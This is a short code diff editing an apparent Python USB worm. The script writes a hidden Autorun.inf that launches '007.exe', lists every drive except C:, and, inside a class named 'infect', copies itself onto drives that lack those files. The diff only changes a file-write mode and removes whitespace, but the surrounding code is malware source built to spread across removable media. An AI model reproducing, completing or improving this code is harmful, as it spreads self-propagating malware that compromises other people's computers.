@@ -13,7 +13,7 @@ def writeconfig:
     icon=007.exe
     action=walawalaningningwalaningning
     '''
-    with open("Autorun.inf",'wb') as loadautorun:
+    with open("Autorun.inf",'w') as loadautorun:
         loadautorun.write(autorun)
     win32api.SetFileAttributes("Autorun.inf",win32con.FILE_ATTRIBUTE_HIDDEN)
     
@@ -42,7 +42,7 @@ class infect:
             drivename = chr(drive) + ':\\'
             if os.path.exists(drivename):
                 drives.append(drivename)
-drives.remove("C:\\")                                
+drives.remove("C:\\")
         for infectwrite in drives:
             os.chdir(infectwrite)
             if '007.exe' and 'Autorun.inf' not in os.listdir(infectwrite):
